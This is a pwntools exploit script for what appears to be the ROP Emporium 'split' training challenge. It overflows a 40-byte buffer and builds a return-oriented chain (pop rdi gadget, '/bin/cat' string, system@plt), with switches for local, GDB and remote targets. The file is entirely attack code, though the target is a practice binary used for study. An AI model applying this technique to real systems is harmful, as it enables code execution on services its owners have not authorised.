from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './split'
elf = context.binary = ELF(exe, checksec=False)
p = start()

pop_rdi = 0x00000000004007c3
ret = 0x000000000040053e
# ===== Exploit script here =====
p.sendlineafter(b'> ', flat(
    b'A'*40,
    pop_rdi,
    next(elf.search(b'/bin/cat')),
    ret,
    elf.plt['system']
))
p.interactive()